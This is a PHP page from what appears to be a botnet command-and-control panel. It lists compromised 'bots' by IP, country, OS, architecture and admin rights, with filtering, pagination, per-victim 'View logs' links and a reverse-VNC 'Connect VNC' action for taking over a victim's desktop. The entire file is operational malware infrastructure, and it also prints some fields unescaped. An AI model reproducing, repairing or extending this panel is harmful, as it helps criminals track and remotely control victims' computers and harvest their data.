<?php

require_once('inc/require.php');
require_once('inc/load.php');

if(!isset($_POST['ajax_response']))
{

require_once('inc/head_new.inc');
require_once('inc/menu.html');
?>
   <section id="content">
            <div class="wrapper">
                <div class="crumb">
                    <ul class="breadcrumb">
                      <li><a href="#"><i class="icon16 i-home-4"></i>Home</a> <span class="divider">/</span></li>
                                         <li class="active">Bots</li>
                    </ul>
                </div>
                
<div class="container-fluid">
                    <div id="heading" class="page-header">
                        <h1><i class="icon20 i-table-2"></i> Bots</h1>
                    </div>

                    <div class="row-fluid">

                        <div class="span12">

                            <div class="widget">
                                <div class="widget-title">
                                    <div class="icon"><i class="icon20 i-table"></i></div> 
                                    <h4>Bots</h4>
                                    <a href="#" class="minimize"></a>
                                    
                                  
                                </div><!-- End .widget-title -->
                            
                                <div class="widget-content">
                                  Search:   <input id="query" type="text" onKeyUp="searchStart(this.value)"  onChange="searchStart(this.value)" onKeyPress="searchStart(this.value)" onEnter="searchStart(this.value)" value="<?php if(isset($_GET['query'])) echo htmlspecialchars(strip_tags($_GET['query']));?>" />

<span id="container">                                    
<?php } ?>

<table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered table-hover" id="dataTable">
                                              <thead>
                                            <tr>
                                                <th width="10%">Unique ID</th>
                                                <th width="8%">IP</th>
                                                <th width="5%">Country</th>
                                                <th width="7%">OS</th>
                                                <th width="5%">Arch</th>
                                                <th width="7%">Permissions</th>
                                                <th width="10%">Last Online</th>
                                                <th width="7%">Online</th>
                                                <th width="10%">Action</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                        
                                        <?php
										$where = '';
										if(isset($_GET['query']))
										{
										
										$query= mysql_real_escape_string(strip_tags($_GET['query']));
										
											$time_Query = '';
										
										if(count(explode('/', $query))==3) 
										{										
										$startTime =strtotime($query.' 00:00:00');
										$endTime = strtotime($query.' 23:59:59');
										if($startTime>0 && $endTime>0) 
										$time_Query = "
										or (knock_time >=$startTime and knock_time<=$endTime) 
										 or (first_time >=$startTime and first_time<=$endTime)";
										}
										
										$where = " WHERE (
										os LIKE '$query%' 
										or country LIKE '$query%' 
										or ip LIKE '%$query%' 
										or arch LIKE '$query%' 
										or user_admin LIKE '$query%' 
										or unique_id LIKE '$query'
										$time_Query
										)";	
											$q = 'query='.$query;										
										}
										else
										
										{

										$q = "";
										if(isset($_GET['os']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['os']));
										$where = " WHERE (os ='$query')";	
										$q = 'os='.htmlspecialchars(strip_tags($_GET['os']));											
										}
										elseif(isset($_GET['ip']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['ip']));
										$where = " WHERE (ip ='$query')";				
										$q = 'ip='.htmlspecialchars(strip_tags($_GET['ip']));								
										}
										elseif(isset($_GET['country']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['country']));
										$where = " WHERE (country ='$query')";
										
										$q = 'country='.htmlspecialchars(strip_tags($_GET['country']));											
										}
										elseif(isset($_GET['arch']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['arch']));
										$where = " WHERE (arch ='$query')";	
										$q = 'arch='.htmlspecialchars(strip_tags($_GET['arch']));										
										}
										elseif(isset($_GET['perms']))
										{
										$query= mysql_real_escape_string(strip_tags($_GET['perms']));
										$where = " WHERE (user_admin ='$query')";
										
										$q = 'perms='.htmlspecialchars(strip_tags($_GET['perms']));										
										}
											elseif(isset($_GET['status']))
										{
										$onlinesecs = $_vars['offline_time'];
										if($_GET['status']=='online') $Pref = '>='.strtotime('-'.$onlinesecs.'seconds'); else  $Pref = '<'.strtotime('-'.$onlinesecs.'seconds'); 
										
										$where = " WHERE (knock_time $Pref)";
										$q = 'status='.htmlspecialchars(strip_tags($_GET['status']));
										}
										
										

}
										
										$strSQL = "SELECT COUNT(*) FROM bots ".$where;

$objQuery = mysql_query($strSQL) or die ("Error Query [".$strSQL."]");
$Num_Rows = mysql_fetch_row($objQuery);
$Num_Rows = (int)$Num_Rows[0];


$Per_Page = $_vars['limit_entries'];

if (!isset($_GET['Page'])) {
    $Page = 1;
} else {
    $Page = (int)$_GET['Page'];
}

$Prev_Page = $Page - 1;
$Next_Page = $Page + 1;

$Page_Start = (($Per_Page * $Page) - $Per_Page);
if ($Num_Rows <= $Per_Page) {
    $Num_Pages = 1;
} elseif (($Num_Rows % $Per_Page) == 0) {
    $Num_Pages = ($Num_Rows / $Per_Page) ;
} else {
    $Num_Pages = ($Num_Rows / $Per_Page) + 1;
    $Num_Pages = (int) $Num_Pages;
}

											$objQuery = mysql_query("SELECT * FROM bots $where ORDER BY knock_time DESC LIMIT $Page_Start , $Per_Page");
                                        while($row= mysql_fetch_array($objQuery))
                                        {
                                       echo '
                                        
                                            <tr class="gradeA">
                                                <td class="center vcenter">'.htmlspecialchars($row['unique_id']).'</td>
                                                <td class="center vcenter"><a href="?ip='.htmlspecialchars($row['ip']).'">'.htmlspecialchars($row['ip']).'</a></td>
                                                <td class="center vcenter"><a href="?country='.htmlspecialchars($row['country']).'"><img alt="" src="images/png/'.strtolower(htmlspecialchars($row['country'])).'.png"> '.$row['country'].'</a></td>
                                                <td class="center vcenter"><a href="?os='.htmlspecialchars($row['os']).'">'.htmlspecialchars($row['os']).'</a></td>
                                                <td class="center vcenter"><a href="?arch='.htmlspecialchars($row['arch']).'">'.htmlspecialchars($row['arch']).'</a></td>
                                                <td class="center vcenter"><a href="?perms='.$row['user_admin'].'">'.$row['user_admin'].'</a></td>
                                                <td class="center vcenter">'.date("H:i:s m/d/Y ",$row['knock_time']).'</td>
                                                <td class="center vcenter"><a href="?status='; 
												$status=(($row['knock_time']>strtotime('-'.$_vars['offline_time'].' seconds')) ? "online" : "offline");
												echo $status.'"><img src="images/icon-user-'.$status.'.png" alt="'.$status.'" />';
												  echo '
                                                  
                                                   
                                                 </td>
                                                
                                                <td class="center vcenter">
                                                    <div class="btn-group">
                                                    <a href="logs.php?unique_id='.htmlspecialchars($row['unique_id']).'" class="btn tip" title="">View logs</i></a>
												  ';
												  
													if(RVNC_ENABLED == TRUE)
													{
														echo('<a href="javascript:ConnectVNC(\''.htmlspecialchars($row['unique_id']).'\', prompt(\'Enter ip and port to connect\', \'127.0.0.1:9500\'));" class="btn tip" title="">Connect VNC</i></a>');
													}
												echo '	
                                                    </div>
                                                </td>
                                            </tr>
                                          ';
										   }
										   ?>
                                           
                                        </tbody>
                                      
                                    </table>
                                    
                                    
                                    <?php
									
echo"                                    Showing $Page_Start to $Per_Page of $Num_Rows entries";


									if ($Prev_Page) {
    echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=$Prev_Page&$q'><< Back</a> ";
}

for ($i=1; $i <= $Num_Pages; $i++) {
    if ($i != $Page) {
        echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=$i&$q'>$i</a> ";
    } else {
        echo "<b> $i </b>"; 
    }
}

if ($Page!=$Num_Pages) {
    echo " <a href ='$_SERVER[SCRIPT_NAME]?Page=$Next_Page&$q'>Next>></a> ";        
}


if(isset($_POST['ajax_response'])) die();
?>

                                    
                                    </span>
                                    
                                </div><!-- End .widget-content -->
                                
                                
                                
                            </div><!-- End .widget -->
                        </div><!-- End .span12  --> 
                                            
                    </div><!-- End .row-fluid  -->